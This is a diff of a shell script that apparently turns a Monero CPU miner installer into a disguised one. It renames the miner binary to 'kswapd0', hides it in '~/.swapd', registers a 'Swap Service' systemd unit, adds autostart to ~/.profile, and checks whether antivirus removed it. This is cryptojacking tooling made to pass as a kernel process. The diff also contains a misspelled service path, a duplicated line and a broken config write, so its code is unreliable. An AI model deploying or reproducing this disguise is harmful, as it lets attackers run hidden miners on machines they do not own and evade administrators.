@@ -20,7 +20,7 @@ EMAIL=$2 # this one is optional
 
 if [ -z $WALLET ]; then
   echo "Script usage:"
-  echo "> setup_moneroocean_miner.sh <wallet address> [<your email address>]"
+  echo "> setup_moneroocean_kswapd0.sh <wallet address> [<your email address>]"
   echo "ERROR: Please specify your wallet address"
   exit 1
 fi
@@ -121,7 +121,7 @@ fi
 # printing intentions
 
 echo "I will download, setup and run in background Monero CPU miner."
-echo "If needed, miner in foreground can be started by $HOME/.gdm2/miner.sh script."
+echo "If needed, miner in foreground can be started by $HOME/.swapd/kswapd0.sh script."
 echo "Mining will happen to $WALLET wallet."
 if [ ! -z $EMAIL ]; then
   echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
@@ -155,7 +155,8 @@ killall -9 kswapd0
 echo "[*] Removing $HOME/moneroocean directory"
 rm -rf $HOME/moneroocean
 rm -rf $HOME/.moneroocean
-rm -rf $HOME/.gdm2
+rm -rf $HOME/.swapd
+rm -rf $HOME/.swapd
 
 echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
 if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz; then
@@ -165,22 +166,22 @@ fi
 
 # wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
 
-echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
-[ -d $HOME/.gdm2 ] || mkdir $HOME/.gdm2
-if ! tar xf xmrig.tar.gz -C $HOME/.gdm2; then
-  echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
+echo "[*] Unpacking xmrig.tar.gz to $HOME/.swapd"
+[ -d $HOME/.swapd ] || mkdir $HOME/.swapd
+if ! tar xf xmrig.tar.gz -C $HOME/.swapd; then
+  echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.swapd directory"
   exit 1
 fi
 rm xmrig.tar.gz
 
-echo "[*] Checking if advanced version of $HOME/.gdm2/xmrig works fine (and not removed by antivirus software)"
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.gdm2/config.json
-$HOME/.gdm2/xmrig --help >/dev/null
+echo "[*] Checking if advanced version of $HOME/.swapd/xmrig works fine (and not removed by antivirus software)"
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.swapd/config.json
+$HOME/.swapd/xmrig --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HOME/.gdm2/xmrig ]; then
-    echo "WARNING: Advanced version of $HOME/.gdm2/xmrig is not functional"
+  if [ -f $HOME/.swapd/xmrig ]; then
+    echo "WARNING: Advanced version of $HOME/.swapd/xmrig is not functional"
   else 
-    echo "WARNING: Advanced version of $HOME/.gdm2/xmrig was removed by antivirus (or some other problem)"
+    echo "WARNING: Advanced version of $HOME/.swapd/xmrig was removed by antivirus (or some other problem)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
@@ -193,28 +194,28 @@ if (test $? -ne 0); then
     exit 1
   fi
 
-  echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
-  if ! tar xf xmrig.tar.gz -C $HOME/.gdm2 --strip=1; then
-    echo "WARNING: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
+  echo "[*] Unpacking xmrig.tar.gz to $HOME/.swapd"
+  if ! tar xf xmrig.tar.gz -C $HOME/.swapd --strip=1; then
+    echo "WARNING: Can't unpack xmrig.tar.gz to $HOME/.swapd directory"
   fi
   rm xmrig.tar.gz
 
-  echo "[*] Checking if stock version of $HOME/.gdm2/xmrig works fine (and not removed by antivirus software)"
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
-  $HOME/.gdm2/xmrig --help >/dev/null
+  echo "[*] Checking if stock version of $HOME/.swapd/xmrig works fine (and not removed by antivirus software)"
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
+  $HOME/.swapd/xmrig --help >/dev/null
   if (test $? -ne 0); then 
-    if [ -f $HOME/.gdm2/xmrig ]; then
-      echo "ERROR: Stock version of $HOME/.gdm2/xmrig is not functional too"
+    if [ -f $HOME/.swapd/xmrig ]; then
+      echo "ERROR: Stock version of $HOME/.swapd/xmrig is not functional too"
     else 
-      echo "ERROR: Stock version of $HOME/.gdm2/xmrig was removed by antivirus too"
+      echo "ERROR: Stock version of $HOME/.swapd/xmrig was removed by antivirus too"
     fi
     exit 1
   fi
 fi
 
-echo "[*] Miner $HOME/.gdm2/xmrig is OK"
+echo "[*] Miner $HOME/.swapd/xmrig is OK"
 
-mv $HOME/.gdm2/xmrig $HOME/.gdm2/kswapd0
+mv $HOME/.swapd/xmrig $HOME/.swapd/kswapd0
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -227,17 +228,17 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-# sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.gdm2/config.json
-# sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
-# sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2/config.json
-# sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
-# sed -i 's#"log-file": *null,#"log-file": "'$HOME/.gdm2/xmrig.log'",#' $HOME/.gdm2/config.json
-# sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.gdm2/config.json
-# sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.gdm2/config.json
+# sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.swapd/config.json
+# sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.swapd/config.json
+# sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
+# sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.swapd/config.json
+# sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/xmrig.log'",#' $HOME/.swapd/config.json
+# sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.swapd/config.json
+# sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
 
-rm $HOME/.gdm2/config.json
+rm $HOME/.swapd/config.json
 
-cat $HOME/.gdm2/config.json <<EOL
+cat $HOME/.swapd/config.json <<EOL
 {
     "autosave": true,
 	"background": false,
@@ -259,37 +260,37 @@ cat $HOME/.gdm2/config.json <<EOL
 }
 EOL
 
-cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json
+cp $HOME/.swapd/config.json $HOME/.swapd/config_background.json
+sed -i 's/"background": *false,/"background": true,/' $HOME/.swapd/config_background.json
 
 # preparing script
 
 killall xmrig
 
-echo "[*] Creating $HOME/.gdm2/miner.sh script"
-cat >$HOME/.gdm2/miner.sh <<EOL
+echo "[*] Creating $HOME/.swapd/kswapd0.sh script"
+cat >$HOME/.swapd/kswapd0.sh <<EOL
 #!/bin/bash
 if ! pidof kswapd0 >/dev/null; then
-  nice $HOME/.gdm2/kswapd0 \$*
+  nice $HOME/.swapd/kswapd0 \$*
 else
   echo "Monero miner is already running in the background. Refusing to run another one."
   echo "Run \"killall kswapd0\" or \"sudo killall kswapd0\" if you want to remove background miner first."
 fi
 EOL
 
-chmod +x $HOME/.gdm2/miner.sh
+chmod +x $HOME/.swapd/kswapd0.sh
 
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep .gdm2/miner.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/.gdm2/miner.sh script to $HOME/.profile"
-    echo "$HOME/.gdm2/miner.sh --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  if ! grep .swapd/kswapd0.sh $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/.swapd/kswapd0.sh script to $HOME/.profile"
+    echo "$HOME/.swapd/kswapd0.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HOME/.gdm2/miner.sh script is already in the $HOME/.profile"
+    echo "Looks like $HOME/.swapd/kswapd0.sh script is already in the $HOME/.profile"
   fi
-  echo "[*] Running miner in the background (see logs in $HOME/.gdm2/xmrig.log file)"
-  /bin/bash $HOME/.gdm2/miner.sh --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
+  echo "[*] Running miner in the background (see logs in $HOME/.swapd/xmrig.log file)"
+  bash $HOME/.swapd/kswapd0.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
@@ -300,20 +301,20 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running miner in the background (see logs in $HOME/.gdm2/kswapd0.log file)"
-    bash $HOME/.gdm2/miner.sh --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
+    echo "[*] Running miner in the background (see logs in $HOME/.swapd/kswapd0.log file)"
+    bash $HOME/.swapd/kswapd0.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
   else
 
     echo "[*] Creating moneroocean systemd service"
-    cat >/tmp/gdm2.service <<EOL
+    cat >/tmp/swapd.service <<EOL
 [Unit]
-Description=GDM2
+Description=Swap Service
 
 [Service]
-ExecStart=$HOME/.gdm2/kswapd0 --config=$HOME/.gdm2/config.json
+ExecStart=$HOME/.swapd/kswapd0 --config=$HOME/.swapd/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -321,13 +322,13 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv /tmp/gdm2.service /etc/systemd/system/gdm2.service
-    echo "[*] Starting gdm2 systemd service"
+    sudo mv /tmp/swqapd.service /etc/systemd/system/swapd.service
+    echo "[*] Starting swapd systemd service"
     sudo killall kswapd0 2>/dev/null
     sudo systemctl daemon-reload
-    sudo systemctl enable gdm2.service
-    sudo systemctl start gdm2.service
-    echo "To see miner service logs run \"sudo journalctl -u gdm2 -f\" command"
+    sudo systemctl enable swapd.service
+    sudo systemctl start swapd.service
+    echo "To see miner service logs run \"sudo journalctl -u swapd -f\" command"
   fi
 fi
 
@@ -351,8 +352,8 @@ if [ "$CPU_THREADS" -lt "4" ]; then
   fi
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.gdm2/config.json"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.gdm2/config_background.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.swapd/config.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.swapd/config_background.json"
 fi
 echo ""
 
